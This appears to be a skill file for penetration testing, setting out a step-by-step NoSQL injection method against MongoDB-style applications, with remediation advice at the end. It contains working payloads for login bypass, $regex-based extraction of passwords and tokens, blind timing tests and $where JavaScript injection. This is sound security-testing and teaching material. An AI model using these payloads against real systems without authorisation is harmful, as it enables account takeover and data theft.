---
name: nosql_injection
description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, and data extraction
---

# NoSQL Injection

NoSQL injection exploits insufficient input sanitization in NoSQL database queries, allowing attackers to bypass authentication, extract data, or modify queries using database-specific operators.

## Attack Surface

**Databases**
- MongoDB (most common), CouchDB, Redis, Cassandra, DynamoDB

**Injection Points**
- JSON request bodies (`Content-Type: application/json`)
- Query parameters parsed into objects
- Login forms, search endpoints, filter parameters

## Testing Methodology

### Step 1 – Detect JSON Parameter Handling
Send object instead of string:
```
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```
If login succeeds without valid credentials → authentication bypass.

### Step 2 – Operator Injection in Query Params
```
GET /users?username[$ne]=invalid
GET /users?age[$gt]=0
```

### Step 3 – Extract Data with `$regex`
```json
{"username": "admin", "password": {"$regex": "^a"}}
```
Iterate character by character to extract password hashes or tokens.

### Step 4 – Blind Injection (Boolean-Based)
Use true/false conditions to infer data:
```json
{"username": "admin", "password": {"$regex": "^secret"}}
```
Time difference or response length difference confirms the condition.

### Step 5 – `$where` JavaScript Injection (MongoDB < 4.4)
```json
{"$where": "sleep(5000)"}
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
```

## Common Payload List

| Operator | Purpose |
|----------|---------|
| `{"$gt": ""}` | Match anything greater than empty string |
| `{"$ne": null}` | Match any non-null value |
| `{"$regex": ".*"}` | Match any string |
| `{"$in": ["admin","root"]}` | Enumerate known values |
| `{"$where": "1==1"}` | JS expression always true |

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Authentication bypass | Critical |
| Arbitrary data extraction with credentials | High |
| Limited record enumeration | Medium |

## Remediation

- Use parameterized queries / ODM validation (e.g., Mongoose schema types)
- Reject or strip keys starting with `$` from user input
- Enable `strict` mode in Mongoose
- Disable `$where` and JavaScript execution in MongoDB (`--noscripting`)
